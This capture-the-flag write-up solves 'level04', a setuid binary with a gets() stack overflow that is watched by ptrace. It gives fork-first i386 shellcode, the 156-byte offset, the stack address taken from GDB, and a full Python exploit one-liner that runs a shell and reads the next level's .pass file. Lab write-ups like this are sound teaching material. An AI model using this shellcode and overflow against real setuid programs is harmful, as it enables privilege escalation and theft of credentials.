# level04

## Objective

Exploit the setuid `level04` binary to execute a shell with `level05`
effective permissions while bypassing its `ptrace` monitoring.

## Vulnerability and constraint

The child process allocates a 128-byte stack buffer and calls:

```c
gets(buffer);
```

The parent traces the child and kills it when it observes syscall `11`
(`execve`). Direct shellcode that calls `execve("/bin/sh", ...)` in the
traced child is detected.

The binary has no stack canary, has NX disabled, and is not PIE. GDB measured
156 bytes from the start of the `gets` buffer to the saved return address.

## Fork-aware shellcode

The injected i386 shellcode first calls `fork`. The original traced child gets
a nonzero result and exits. The new untraced child gets zero and continues into
the `execve("/bin/sh")` code. The monitored process exits before the shell
process invokes `execve`.

## Stable stack layout

ASLR is disabled on the supplied VM:

```sh
cat /proc/sys/kernel/randomize_va_space
```

```text
0
```

The buffer address measured under a normal GDB launch did not work outside GDB.
GDB changes the initial stack layout. An empty environment makes the
measurement and final launch agree:

```gdb
set exec-wrapper env -i
set follow-fork-mode child
break *0x0804875e
run
p/x *(unsigned int *)$esp
```

The observed buffer address was `0xffffddc0`.

## Exploit

Run this from the `level04` home directory:

```sh
(python -c 'import sys,struct; shellcode="\x31\xc0\x31\xdb\xb0\x02\xcd\x80\x85\xc0\x75\x18\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd\x80"; sys.stdout.write(shellcode + "A" * (156 - len(shellcode)) + struct.pack("<I", 0xffffddc0) + "\n")'; cat) | env -i /home/users/level04/level04
```

The payload places the fork-aware shellcode at the start of the buffer, pads
to the saved return address, and overwrites it with the buffer address. The
trailing `cat` keeps standard input connected to the shell.

Verify the effective user and read the next password:

```sh
/usr/bin/id
/bin/cat /home/users/level05/.pass
```

Observed identity:

```text
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users)
```

The recovered level05 password is recorded in `flag`.